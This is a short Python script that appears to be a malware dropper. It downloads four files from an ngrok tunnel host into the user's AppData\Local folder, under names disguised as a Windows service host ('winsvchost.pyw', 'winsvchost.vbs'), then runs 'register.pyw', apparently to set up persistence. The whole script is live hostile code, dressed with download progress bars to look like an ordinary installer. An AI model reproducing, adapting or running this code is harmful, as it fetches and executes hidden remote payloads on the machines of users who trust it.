import os
import time

user = os.getlogin()
os.system("pip install -r requirements.txt")

from tqdm import tqdm
import requests

def one():
    url_1 = 'http://1aca-2405-201-3013-a0d4-69b1-b9d5-d-9b43.ngrok.io/winsvchost.pyw'
    response = requests.get(url_1, stream=True)
    total_size_in_bytes= int(response.headers.get('content-length', 0))
    block_size = 1024 
    progress_bar = tqdm(total=total_size_in_bytes, unit='iB', unit_scale=True)
    with open('C://Users//'+ str(user) +'\\AppData\\Local\\winsvchost.pyw', 'wb') as file:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            file.write(data)
    progress_bar.close()
    if total_size_in_bytes != 0 and progress_bar.n != total_size_in_bytes:
        print("ERROR, something went wrong")


    url_2 = 'http://1aca-2405-201-3013-a0d4-69b1-b9d5-d-9b43.ngrok.io/winsvchost.vbs'
    response = requests.get(url_2, stream=True)
    total_size_in_bytes= int(response.headers.get('content-length', 0))
    block_size = 1024 
    progress_bar = tqdm(total=total_size_in_bytes, unit='iB', unit_scale=True)
    with open('C://Users//'+ str(user) +'\\AppData\\Local\\winsvchost.vbs', 'wb') as file:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            file.write(data)
    progress_bar.close()
    if total_size_in_bytes != 0 and progress_bar.n != total_size_in_bytes:
        print("ERROR, something went wrong")


    url_3 = 'http://1aca-2405-201-3013-a0d4-69b1-b9d5-d-9b43.ngrok.io/register.pyw'
    response = requests.get(url_3, stream=True)
    total_size_in_bytes= int(response.headers.get('content-length', 0))
    block_size = 1024 
    progress_bar = tqdm(total=total_size_in_bytes, unit='iB', unit_scale=True)
    with open('C://Users//'+ str(user) +'\\AppData\\Local\\register.pyw', 'wb') as file:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            file.write(data)
    progress_bar.close()
    if total_size_in_bytes != 0 and progress_bar.n != total_size_in_bytes:
        print("ERROR, something went wrong")


    url_4 = 'http://1aca-2405-201-3013-a0d4-69b1-b9d5-d-9b43.ngrok.io/dir_winsvchost.pyw'
    response = requests.get(url_4, stream=True)
    total_size_in_bytes= int(response.headers.get('content-length', 0))
    block_size = 1024 
    progress_bar = tqdm(total=total_size_in_bytes, unit='iB', unit_scale=True)
    with open('C://Users//'+ str(user) +'\\AppData\\Local\\dir_winsvchost.pyw', 'wb') as file:
        for data in response.iter_content(block_size):
            progress_bar.update(len(data))
            file.write(data)
    progress_bar.close()
    if total_size_in_bytes != 0 and progress_bar.n != total_size_in_bytes:
        print("ERROR, something went wrong")

    try:
        print('Finalizing')
        os.system('python C://Users//'+ str(user) +'\\AppData\\Local\\register.pyw')
        print('Done.')
        print('Exiting Program.')
        time.sleep(5)
    except:
        print('Some error occured.')
        time.sleep(10)

one()
